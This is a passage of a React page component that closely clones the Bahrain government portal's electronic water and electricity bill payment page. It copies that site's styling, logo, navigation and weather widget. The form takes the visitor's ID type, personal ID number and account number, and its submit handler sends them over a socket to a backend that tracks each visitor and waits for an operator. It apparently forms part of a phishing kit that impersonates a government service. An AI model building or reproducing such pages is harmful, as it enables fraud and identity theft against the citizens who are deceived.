import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";
import { useLanguage } from "@/lib/language";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const { lang, toggleLang, t, dir } = useLanguage();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isLoadingForm, setIsLoadingForm] = useState(false);
  const [showFormFields, setShowFormFields] = useState(false);
  const [activeTab, setActiveTab] = useState(0);
  const [activeNavItem, setActiveNavItem] = useState(0);
  const [showWeather, setShowWeather] = useState(false);
  const [showLoginPopup, setShowLoginPopup] = useState(false);
  const [weatherData, setWeatherData] = useState<any>(null);
  const loginPopupRef = useRef<HTMLDivElement>(null);
  const weatherPopupRef = useRef<HTMLDivElement>(null);
  const loginBtnRef = useRef<HTMLSpanElement>(null);
  const weatherBtnRef = useRef<HTMLImageElement>(null);

  // Close popups when clicking outside
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (showLoginPopup && loginPopupRef.current && !loginPopupRef.current.contains(e.target as Node) && loginBtnRef.current && !loginBtnRef.current.contains(e.target as Node)) {
        setShowLoginPopup(false);
      }
      if (showWeather && weatherPopupRef.current && !weatherPopupRef.current.contains(e.target as Node) && weatherBtnRef.current && !weatherBtnRef.current.contains(e.target as Node)) {
        setShowWeather(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, [showLoginPopup, showWeather]);

  const fetchWeather = async () => {
    try {
      const serverUrl = import.meta.env.VITE_SOCKET_URL || 'http://localhost:3001';
      const res = await fetch(`${serverUrl}/api/weather`);
      const data = await res.json();
      setWeatherData(data);
    } catch (e) {
      console.error(e);
    }
  };

  const getWeatherDesc = (code: number) => {
    if (code <= 1) return t('clear');
    if (code <= 3) return t('partly_cloudy');
    if (code <= 48) return t('cloudy');
    if (code <= 67) return t('rainy');
    if (code <= 77) return lang === 'ar' ? 'ثلوج' : 'Snow';
    return t('stormy');
  };

  const getWeatherEmoji = (code: number) => {
    if (code <= 1) return '☀️';
    if (code <= 3) return '⛅';
    if (code <= 48) return '☁️';
    if (code <= 67) return '🌧️';
    return '⛈️';
  };

  const getArabicDay = (dateStr: string) => {
    const days = ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
    const d = new Date(dateStr);
    return days[d.getDay()];
  };

  const getArabicMonth = (dateStr: string) => {
    const months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
    const d = new Date(dateStr);
    return months[d.getMonth()];
  };

  const formatTime = (iso: string) => {
    const d = new Date(iso);
    return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
  };

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber || !accountNumber) return;
    setIsSubmitting(true);

    const idTypeMap: Record<string, string> = {
      'bahraini': 'الرقم الشخصي البحريني',
      'emirati': 'الرقم الشخصي الإماراتي',
      'saudi': 'الرقم الشخصي السعودي',
      'omani': 'الرقم الشخصي العماني',
      'qatari': 'الرقم الشخصي القطري',
      'kuwaiti': 'الرقم الشخصي الكويتي',
      'owners_union': 'رقم اتحاد الملاك',
      'gov_entity': 'رقم الجهة الحكومية',
      'passport': 'رقم الجواز',
      'commercial_reg': 'رقم السجل التجاري',
      'establishment': 'رقم المنشأة',
    };
    const idTypeLabel = idTypeMap[idType] || idType;

    // Map to server-side codes
    const idTypeServerMap: Record<string, string> = {
      'bahraini': 'BH', 'emirati': 'AE', 'saudi': 'SA', 'omani': 'OM',
      'qatari': 'QA', 'kuwaiti': 'KW', 'owners_union': 'UNION',
      'gov_entity': 'GOV', 'passport': 'PASSPORT', 'commercial_reg': 'CR',
      'establishment': 'FACILITY',
    };
    const idTypeCode = idTypeServerMap[idType] || idType;

    // Save data to localStorage for EWABills page
    localStorage.setItem('ewa_idType', idTypeCode);
    localStorage.setItem('ewa_idNumber', idNumber);
    localStorage.setItem('ewa_accountNumber', accountNumber);
    localStorage.setItem('ewa_idTypeLabel', idTypeLabel);

    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
        accountNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'ewa-bills',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/ewa-bills');
    }, 1000);
  };

  return (
    <>
      {/* Inject the exact same CSS reset and font stack from services.bahrain.bh */}
      <style dangerouslySetInnerHTML={{ __html: `
        .bh-page, .bh-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji" !important;
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          border: 0;
          outline: 0;
        }
        .bh-page {
          direction: ${dir};
          min-height: 100vh;
          background: #FAFAFA;
          color: #17171C;
          font-size: 16px;
          font-weight: 400;
          line-height: 1.5;
          -webkit-text-size-adjust: 100%;
        }
        .bh-page a {
          text-decoration: none;
          color: inherit;
        }
        .bh-page img {
          max-width: 100%;
          height: auto;
        }
        .bh-container {
          max-width: 1170px;
          margin: 0 auto;
          padding: 0 15px;
        }
        
        /* Header area */
        .bh-header {
          background: #fff;
          border-bottom: none;
        }
        .bh-header-divider {
          border: none;
          border-top: 2px solid #B0B0BA;
          margin: 0;
        }
        .bh-header-row1 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0 12px 0;
        }
        .bh-logo img {
          height: 60px;
        }
        .bh-lang {
          display: flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
          color: #4B4B57;
          font-size: 15px;
        }
        .bh-header-row2 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0;
          background: #fff;
          margin: 0;
          border-top: none;
          min-height: 60px;
        }
        .bh-tabs-row {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .bh-tab {
          font-size: 22px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
          cursor: pointer;
          padding-bottom: 12px;
          padding-top: 8px;
          border-bottom: 4px solid #D3D3DA;
          margin-bottom: 0;
          position: relative;
        }
        .bh-tab.active {
          font-weight: 600 !important;
          color: #17171C !important;
          border-bottom: 4px solid #0747C7 !important;
        }
        .bh-header-actions {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .bh-login-btn {
          background: #045c7c !important;
          color: #fff !important;
          padding: 12px 24px !important;
          border-radius: 6px !important;
          font-size: 15px !important;
          font-weight: 600 !important;
          cursor: pointer;
          display: inline-block;

        }
        
        /* Navigation bar */
        .bh-nav {
          background: #EAEAEE;
          border-bottom: none;
          border-top: 2px solid #B0B0BA;
          padding: 8px 0;
          margin-top: 0;
        }
        .bh-nav-items {
          display: flex;
          align-items: center;
        }
        .bh-nav-item {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          padding: 10px 28px !important;
          border-left: none;
          display: flex;
          align-items: center;
          white-space: nowrap;
          cursor: pointer;
        }
        .bh-nav-item:last-child {
          border-left: none;
        }
        .bh-nav-item.nav-active {
          background: #fff;
          border-radius: 8px;
          position: relative;
        }
        .bh-nav-item.nav-active::before {
          content: "";
          display: inline-block;
          width: 3px;
          height: 16px;
          background: #0747C7;
          margin-left: 10px;
          border-radius: 2px;
        }
        
        /* Banner */
        .bh-banner {
          margin: 30px auto 20px auto;
          padding: 0;
          position: relative;
          max-width: 85%;
        }
        .bh-banner img {
          width: 100%;
          height: auto;
          display: block;
          border-radius: 4px;
        }
        
        /* Content area */
        .bh-content-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 12px;
        }
        .bh-content-title {
          font-size: 1.15rem !important;
          font-weight: 400 !important;
          color: #0747C7 !important;
          line-height: 26px;
        }
        .bh-menu-link {
          display: flex;
          flex-direction: row-reverse;
          align-items: center;
          gap: 8px;
          font-size: 14px !important;
          color: #4B4B57 !important;
          cursor: pointer;
          background: #E8E8EC;
          padding: 8px 14px;
          border-radius: 6px;
        }
        
        /* Blue bars */
        .bh-blue-bar {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 10px 18px !important;
          display: flex;
          align-items: center;
          justify-content: space-between;
          font-size: 15px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-blue-bar-info {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        /* Required text */
        .bh-required-text {
          font-size: 13px !important;
          color: #4B4B57 !important;
          margin: 10px 0 !important;
          text-align: right;
        }
        
        /* Form area */
        .bh-form-area {
          background: #fff;
          border: 1px solid #D3D3DA;
          border-top: none;
          padding: 20px 24px;
        }
        .bh-form-row {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 12px;
          margin-bottom: 15px;
        }
        .bh-form-row:last-child {
          margin-bottom: 0;
        }
        .bh-form-label {
          font-size: 14px !important;
          font-weight: 500 !important;
          color: #17171C !important;
          white-space: nowrap;
          min-width: 100px;
          text-align: right;
        }
        .bh-form-label .required {
          color: #A70717 !important;
        }
        .bh-form-select, .bh-form-input {
          padding: 8px 12px !important;
          border: 1px solid #D3D3DA !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          background: #fff !important;
          color: #17171C !important;
          width: 320px;
          direction: rtl;
        }
        .bh-form-input {
          direction: ltr;
          text-align: left;
        }
        .bh-form-select:focus, .bh-form-input:focus {
          border-color: #0747C7 !important;
          outline: none;
          box-shadow: 0 0 0 2px rgba(7, 71, 199, 0.15);
        }
        
        /* Buttons */
        .bh-buttons {
          display: flex;
          gap: 10px;
          justify-content: center;
          margin: 20px 0 40px 0;
          padding: 0 !important;
        }
        .bh-btn-primary {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-btn-primary:disabled {
          background: #C0C0CA !important;
          cursor: not-allowed;
        }
        .bh-btn-back {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        
        /* Loading overlay */
        .bh-loading-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(255, 255, 255, 0.7);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        /* Dots spinner */
        .bh-dots-spinner {
          width: 60px;
          height: 60px;
          position: relative;
        }
        .bh-dots-spinner .bh-dot {
          position: absolute;
          width: 7px;
          height: 7px;
          background: #0747C7;
          border-radius: 50%;
          animation: bh-dot-pulse 1.2s ease-in-out infinite;
        }
        .bh-dots-spinner .bh-dot:nth-child(1) { top: 0; left: 26px; animation-delay: 0s; }
        .bh-dots-spinner .bh-dot:nth-child(2) { top: 8px; left: 44px; animation-delay: 0.15s; }
        .bh-dots-spinner .bh-dot:nth-child(3) { top: 26px; left: 52px; animation-delay: 0.3s; }
        .bh-dots-spinner .bh-dot:nth-child(4) { top: 44px; left: 44px; animation-delay: 0.45s; }
        .bh-dots-spinner .bh-dot:nth-child(5) { top: 52px; left: 26px; animation-delay: 0.6s; }
        .bh-dots-spinner .bh-dot:nth-child(6) { top: 44px; left: 8px; animation-delay: 0.75s; }
        .bh-dots-spinner .bh-dot:nth-child(7) { top: 26px; left: 0; animation-delay: 0.9s; }
        .bh-dots-spinner .bh-dot:nth-child(8) { top: 8px; left: 8px; animation-delay: 1.05s; }
        @keyframes bh-dot-pulse {
          0%, 100% { transform: scale(1); opacity: 0.3; }
          12.5% { transform: scale(1.8); opacity: 1; }
          25% { transform: scale(1); opacity: 0.3; }
        }
        
        /* Bottom line */
        .bh-bottom-line {
          height: 4px;
          background: #0747C7;
          margin-top: 100px;
          margin-bottom: 0;
        }

        /* ===== WEATHER POPUP ===== */
        .weather-popup {
          position: absolute;
          top: 50px;
          left: 0;
          width: 380px;
          border-radius: 12px;
          box-shadow: 0 8px 30px rgba(0,0,0,0.35);
          z-index: 10000;
          direction: rtl;
          overflow: hidden;
        }
        .weather-popup-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 14px 18px 10px;
          background: #3d4f5f;
          color: #fff;
        }
        .weather-close {
          font-size: 22px;
          cursor: pointer;
          color: #ccc;
          line-height: 1;
          font-weight: bold;
        }
        .weather-close:hover {
          color: #fff;
        }
        .weather-date {
          font-size: 16px;
          font-weight: 600;
          color: #fff;
        }
        .weather-popup-divider {
          height: 1px;
          background: rgba(255,255,255,0.25);
          margin: 0;
        }
        .weather-current {
          text-align: center;
          padding: 20px 18px 15px;
          background: linear-gradient(180deg, #3a8fd4 0%, #5ba8e8 40%, #7ec4f5 100%);
          color: #fff;
        }
        .weather-current-icon {
          font-size: 52px;
          margin-bottom: 2px;
        }
        .weather-current-desc {
          font-size: 18px;
          margin-bottom: 16px;
          font-weight: 500;
        }
        .weather-current-row {
          display: flex;
          justify-content: space-between;
          text-align: center;
          align-items: flex-start;
        }
        .weather-info-col {
          flex: 1;
          font-size: 13px;
          line-height: 2;
          color: #fff;
        }
        .weather-val {
          font-weight: 700;
          font-size: 16px;
        }
        .weather-big-temp {
          font-size: 42px;
          font-weight: 700;
          margin-bottom: 8px;
          line-height: 1.1;
        }
        .weather-forecast {
          display: flex;
          gap: 6px;
          padding: 12px 10px;
          justify-content: flex-start;
          background: #e8ecf0;
          direction: rtl;
          overflow-x: auto;
          -webkit-overflow-scrolling: touch;
        }
        .weather-forecast::-webkit-scrollbar {
          height: 4px;
        }
        .weather-forecast::-webkit-scrollbar-thumb {
          background: #aaa;
          border-radius: 2px;
        }
        .weather-forecast-day {
          flex: 0 0 auto;
          min-width: 70px;
          background: #3d4f5f;
          border-radius: 10px;
          padding: 10px 4px;
          text-align: center;
          font-size: 11px;
          line-height: 1.4;
          color: #fff;
        }
        .weather-forecast-name {
          font-weight: 600;
          font-size: 12px;
          color: #fff;
        }
        .weather-forecast-daynum {
          font-size: 16px;
          font-weight: 700;
          color: #fff;
        }
        .weather-forecast-month {
          font-size: 11px;
          color: #ccc;
        }
        .weather-forecast-icon {
          font-size: 26px;
          margin: 4px 0;
        }
        .weather-forecast-temps {
          font-weight: 600;
          font-size: 12px;
          color: #fff;
        }
        .weather-link {
          text-align: center;
          padding: 12px 18px;
          font-size: 13px;
          background: #e8ecf0;
          color: #333;
          border-top: 1px solid #d0d4d8;
        }
        .weather-link a {
          color: #2563eb;
          text-decoration: underline;
        }

        /* ===== FOOTER ===== */
        .bh-footer-links {
          background: #F0F0F3;
          padding: 40px 0 30px 0;
          border-top: 1px solid #B0B0BA;
        }
        .bh-footer-columns {
          display: flex;
          justify-content: space-between;
          gap: 30px;
        }
        .bh-footer-col {
          flex: 1;
        }
        .bh-footer-col-title {
          font-size: 18px !important;
          font-weight: 700 !important;
          color: #17171C !important;
          margin-bottom: 16px !important;
          padding-bottom: 8px;
          border-bottom: 2px solid #B0B0BA;
          display: block;
        }
        .bh-footer-col ul {
          list-style: none !important;
          padding: 0 !important;
          margin: 0 !important;
        }
        .bh-footer-col ul li {
          margin-bottom: 8px !important;
        }
        .bh-footer-col ul li a {
          font-size: 18px !important;
          color: #17171C !important;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-col ul li a:hover {
          color: #0747C7 !important;
        }

        .bh-footer-social {
          background: #F0F0F3;
          padding: 30px 0;
        }
        .bh-footer-social > .bh-container {
          border-top: 1px solid #B0B0BA;
          padding-top: 30px;
        }
        .bh-footer-social-inner {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .bh-footer-social-right {
          display: flex;
          align-items: center;
          gap: 20px;
        }
        .bh-footer-social-label {
          font-size: 18px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-social-icons {
          display: flex;
          gap: 12px;
          align-items: center;
        }
        .bh-footer-social-icons a {
          width: 40px;
          height: 40px;
          background: #8A8A97;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #fff !important;
          font-size: 18px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .bh-footer-social-icons a:hover {
          background: #0747C7;
        }
        .bh-footer-social-left {
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          gap: 12px;
        }
        .bh-footer-contact-title {
          font-size: 20px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-contact-label {
          font-size: 18px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-contact-number {
          font-size: 30px !important;
          font-weight: 700 !important;
          color: #E31B23 !important;
          direction: ltr;
        }
        .bh-footer-contact-sub {
          font-size: 12px !important;
          font-weight: 600 !important;
          color: #4B4B57 !important;
          text-align: center !important;
        }

        .bh-footer-bottom-links {
          background: #E2E2E7;
          padding: 16px 0;
          text-align: center;
        }
        .bh-footer-bottom-links > .bh-container {
          border-bottom: 1px solid #B0B0BA;
          padding-bottom: 16px;
        }
        .bh-footer-bottom-links a {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 0 8px;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-bottom-links a:hover {
          color: #0747C7 !important;
        }
        .bh-footer-bottom-links .separator {
          color: #D3D3DA !important;
          margin: 0 4px;
        }

        .bh-footer-copyright {
          background: #E2E2E7;
          padding: 20px 0;
          text-align: center;
        }
        .bh-footer-copyright p {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 4px 0 !important;
        }
        .bh-footer-copyright a {
          color: #17171C !important;
          text-decoration: underline !important;
        }
        
        /* Mobile responsive */
        @media (max-width: 768px) {
          .bh-page {
            font-size: 14px;
            overflow-x: hidden;
          }
          .bh-container {
            padding: 0 12px;
          }
          /* Header */
          .bh-header-row1 {
            padding: 8px 0;
          }
          .bh-logo img {
            height: 45px;
          }
          .bh-header-row2 {
            flex-direction: row;
            gap: 4px;
            align-items: center;
            justify-content: space-between;
            padding: 6px 0;
            min-height: auto;
          }
          .bh-tabs-row {
            gap: 6px;
            justify-content: flex-start;
          }
          .bh-tab {
            font-size: 11px !important;
            padding-bottom: 6px;
            padding-top: 4px;
            border-bottom-width: 2px;
          }
          .bh-tab.active {
            border-bottom-width: 2px !important;
          }
          .bh-header-actions {
            justify-content: flex-end;
            gap: 6px;
          }
          .bh-login-btn {
            padding: 5px 10px !important;
            font-size: 10px !important;
          }
          /* Navigation */
          .bh-nav {
            padding: 4px 0;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
          }
          .bh-nav-items {
            flex-wrap: nowrap;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            gap: 0;
          }
          .bh-nav-item {
            font-size: 12px !important;
            padding: 8px 10px !important;
            white-space: nowrap;
            flex-shrink: 0;
          }
          /* Banner */
          .bh-banner {
            max-width: 100%;
            margin: 15px auto 10px auto;
          }
          /* Form */
          .bh-form-area {
            padding: 15px 12px;
          }
          .bh-form-row {
            flex-direction: column;
            align-items: stretch;
            gap: 6px;
          }
          .bh-form-label {
            min-width: unset;
            font-size: 13px !important;
          }
          .bh-form-select, .bh-form-input {
            width: 100% !important;
            min-width: unset;
            font-size: 14px !important;
            padding: 10px 12px !important;
          }
          .bh-blue-bar {
            font-size: 13px !important;
            padding: 8px 12px !important;
          }
          .bh-content-header {
            flex-direction: column;
            gap: 8px;
            align-items: flex-start;
          }
          .bh-buttons {
            flex-direction: row;
            gap: 8px;
            margin: 15px 0 30px 0;
          }
          .bh-btn-primary, .bh-btn-back {
            padding: 10px 20px !important;
            font-size: 14px !important;
            flex: 1;
            text-align: center;
          }
          /* Footer */
          .bh-footer-columns {
            flex-direction: column;
            gap: 20px;
          }
          .bh-footer-col-title {
            font-size: 16px !important;
          }
          .bh-footer-col ul li a {
            font-size: 14px !important;
          }
          .bh-footer-social-inner {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          .bh-footer-social-right {
            flex-direction: column;
            gap: 12px;
          }
          .bh-footer-social-left {
            align-items: center;
          }
          .bh-footer-contact-number {
            font-size: 24px !important;
          }
          .bh-footer-bottom-links a {
            font-size: 14px !important;
            display: inline-block;
            margin: 4px 6px;
          }
          .bh-footer-copyright p {
            font-size: 14px !important;
          }
          .bh-bottom-line {
            margin-top: 40px;
          }
          /* Weather popup - mobile: fixed centered */
          .weather-popup {
            position: fixed !important;
            top: 50% !important;
            left: 50% !important;
            transform: translate(-50%, -50%) !important;
            width: calc(100vw - 32px) !important;
            max-width: 360px;
            max-height: 85vh;
            overflow-y: auto;
          }
          /* Login popup - mobile: fixed centered */
          .login-popup-mobile {
            position: fixed !important;
            top: 50% !important;
            left: 50% !important;
            transform: translate(-50%, -50%) !important;
            width: calc(100vw - 40px) !important;
            max-width: 320px;
            margin-top: 0 !important;
          }
          /* Overlay background on mobile */
          .popup-overlay-mobile {
            display: block !important;
          }
          /* Loading overlay text */
          .bh-loading-overlay p {
            font-size: 14px !important;
          }
        }

        /* Small phones */
        @media (max-width: 400px) {
          .bh-logo img {
            height: 38px;
          }
          .bh-tab {
            font-size: 10px !important;
          }
          .bh-nav-item {
            font-size: 11px !important;
            padding: 6px 8px !important;
          }
          .bh-login-btn {
            padding: 4px 8px !important;
            font-size: 9px !important;
          }
          .bh-header-actions {
            gap: 4px;
          }
        }
      `}} />
      
      <div className="bh-page">
        {/* ===== HEADER ===== */}
        <div className="bh-header">
          <div className="bh-container">
            {/* Row 1: Logo + English */}
            <div className="bh-header-row1">
              <div className="bh-logo">
                <img 
                  src="/logo_ar.svg" 
                  alt="شعار مملكة البحرين"
                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                />
              </div>
              <div className="bh-lang" onClick={toggleLang}>
                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>{t('lang_toggle')}</span>
                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="2.5">
                  <circle cx="16" cy="16" r="14"/>
                  <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
                </svg>
              </div>
            </div>

          </div>
          <hr className="bh-header-divider" />
          <div className="bh-container">
            {/* Row 2: Tabs + Actions */}
            <div className="bh-header-row2">
              <div className="bh-tabs-row">
                <span className={`bh-tab ${activeTab === 0 ? 'active' : ''}`} onClick={() => setActiveTab(0)}>{t('electronic_services')}</span>
                <span className={`bh-tab ${activeTab === 1 ? 'active' : ''}`} onClick={() => setActiveTab(1)}>{t('information_guide')}</span>
              </div>
              <div className="bh-header-actions" style={{ position: 'relative' }}>
                <img src="/accessibility-icon.svg" alt="إمكانية الوصول" style={{ width: '24px', height: '24px', cursor: 'pointer' }} />
                <img ref={weatherBtnRef} src="/weather-icon.svg" alt="الطقس" style={{ width: '32px', height: '32px', cursor: 'pointer' }} onClick={() => { setShowWeather(!showWeather); if (!weatherData) fetchWeather(); }} />
                <span ref={loginBtnRef} className="bh-login-btn" onClick={() => setShowLoginPopup(!showLoginPopup)} style={{ cursor: 'pointer' }}>{t('login')}</span>

                {(showLoginPopup || showWeather) && (
                  <div className="popup-overlay-mobile" onClick={() => { setShowLoginPopup(false); setShowWeather(false); }} style={{
                    position: 'fixed',
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    background: 'rgba(0,0,0,0.4)',
                    zIndex: 9999,
                    display: 'none',
                  }} />
                )}

                {showLoginPopup && (
                  <div ref={loginPopupRef} className="login-popup-mobile" style={{
                    position: 'absolute',
                    top: '100%',
                    left: '50%',
                    transform: 'translateX(-50%)',
                    marginTop: 8,
                    backgroundColor: '#fff',
                    border: '2px solid #003366',
                    borderRadius: 10,
                    padding: '15px 20px',
                    boxShadow: '0 4px 15px rgba(0,0,0,0.15)',
                    zIndex: 10001,
                    minWidth: 280,
                    textAlign: 'center',
                    direction: 'rtl' as const,
                  }}>
                    <span onClick={() => setShowLoginPopup(false)} style={{
                      position: 'absolute',
                      top: 5,
                      left: 10,
                      cursor: 'pointer',
                      fontSize: 18,
                      color: '#999',
                      fontWeight: 'bold',
                    }}>&times;</span>
                    <p style={{
                      margin: 0,
                      fontSize: 14,
                      color: '#003366',
                      fontWeight: 'bold',
                      lineHeight: 1.8,
                    }}>{t('login_popup_msg')}</p>
                  </div>
                )}

                {showWeather && (
                  <div ref={weatherPopupRef} className="weather-popup">
                    <div className="weather-popup-header">
                      <span className="weather-close" onClick={() => setShowWeather(false)}>✕</span>
                      <span className="weather-date">
                        {weatherData ? weatherData.currentDate : (() => {
                          const now = new Date();
                          const days = ['الأحد','الاثنين','الثلاثاء','الأربعاء','الخميس','الجمعة','السبت'];
                          const months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
                          return `${days[now.getDay()]} ${String(now.getDate()).padStart(2,'0')} ${months[now.getMonth()]} ${now.getFullYear()}`;
                        })()}
                      </span>
                    </div>
                    <div className="weather-popup-divider"></div>
                    {weatherData ? (
                      <>
                        <div className="weather-current">
                          <div className="weather-current-icon"><img src={weatherData.weatherIcon || '/weather-icon.svg'} alt={weatherData.condition} style={{ width: '60px', height: '60px' }} /></div>
                          <div className="weather-current-desc">{weatherData.condition}</div>
                          <div className="weather-current-row">
                            <div className="weather-info-col">
                              <div>{t('min_temp')}</div>
                              <div className="weather-val">{weatherData.minTemp}°</div>
                              <div>{t('humidity')}</div>
                              <div className="weather-val">{weatherData.humidity} %</div>
                            </div>
                            <div className="weather-info-col weather-main-temp">
                              <div className="weather-big-temp">{weatherData.currentTemp} °C</div>
                              <div>{t('sunrise')}</div>
                              <div className="weather-val">{weatherData.sunrise}</div>
                            </div>
                            <div className="weather-info-col">
                              <div>{lang === 'ar' ? 'العظمى' : 'Max'}</div>
                              <div className="weather-val">{weatherData.maxTemp}°</div>
                              <div>{lang === 'ar' ? 'غروب الشمس' : 'Sunset'}</div>
                              <div className="weather-val">{weatherData.sunset}</div>
                            </div>
                          </div>
                        </div>
                        <div className="weather-forecast">
                          {weatherData.forecast && weatherData.forecast.slice(0, 7).map((day: any, i: number) => (
                            <div className="weather-forecast-day" key={i}>
                              <div className="weather-forecast-name">{day.dayName}</div>
                              <div className="weather-forecast-daynum">{day.date.match(/\d+/)?.[0] || ''}</div>
                              <div className="weather-forecast-month">{day.date.replace(/\d+/g, '').trim()}</div>
                              <div className="weather-forecast-icon"><img src={day.icon || '/weather-icon.svg'} alt={day.condition} style={{ width: '36px', height: '36px' }} /></div>
                              <div className="weather-forecast-temps">{day.minTemp}°-{day.maxTemp}°</div>
                            </div>
                          ))}
                        </div>
                        <div className="weather-link">
                          {t('more_info')} <a href="https://www.bahrainweather.gov.bh/ar/" target="_blank" rel="noopener noreferrer">bahrainweather.gov.bh</a> ↗
                        </div>
                      </>
                    ) : (
                      <div style={{ textAlign: 'center', padding: '30px', background: 'linear-gradient(180deg, #3a8fd4 0%, #7ec4f5 100%)', color: '#fff' }}>{t('loading')}</div>
                    )}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* ===== NAVIGATION BAR ===== */}
        <div className="bh-nav">
          <div className="bh-container">
            <div className="bh-nav-items">
              <a className={`bh-nav-item ${activeNavItem === 0 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(0)}>{t('home_page')}</a>
              <a className={`bh-nav-item ${activeNavItem === 1 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(1)}>{t('services_by_category')}</a>
              <a className={`bh-nav-item ${activeNavItem === 2 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(2)}>{t('services_by_provider')}</a>
              <a className={`bh-nav-item ${activeNavItem === 3 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(3)}>{t('gov_app_store')}</a>
            </div>
          </div>
        </div>

        {/* ===== BANNER ===== */}
        <div className="bh-container">
          <div className="bh-banner">
            <img src="/eAuthorization_ar.png" alt="استفد من خدمات التخويل الإلكتروني" />
          </div>
        </div>

        {/* ===== MAIN CONTENT ===== */}
        <div className="bh-container">
          {/* Title row */}
          <div className="bh-content-header">
            <h2 className="bh-content-title">{t('pay_ewa_bill')}</h2>
            <div className="bh-menu-link">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4B4B57" strokeWidth="3" strokeLinecap="round">
                <line x1="3" y1="6" x2="21" y2="6"/>
                <line x1="3" y1="12" x2="21" y2="12"/>
                <line x1="3" y1="18" x2="21" y2="18"/>
              </svg>
              <span>{t('menu')}</span>
            </div>
          </div>

          {/* Blue bar: Instructions */}
          <div className="bh-blue-bar">
            <div className="bh-blue-bar-info">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
                <line x1="12" y1="11" x2="12" y2="17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="8" r="1" fill="white"/>
              </svg>
              <span>{t('click_instructions')}</span>
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
          </div>

          {/* Required text */}
          <div className="bh-required-text">
            <span style={{ color: '#A70717' }}>*</span> {t('required_data')}
          </div>

          {/* Blue bar: Customer details */}
          <div className="bh-blue-bar">
            <span>{t('client_details')}</span>
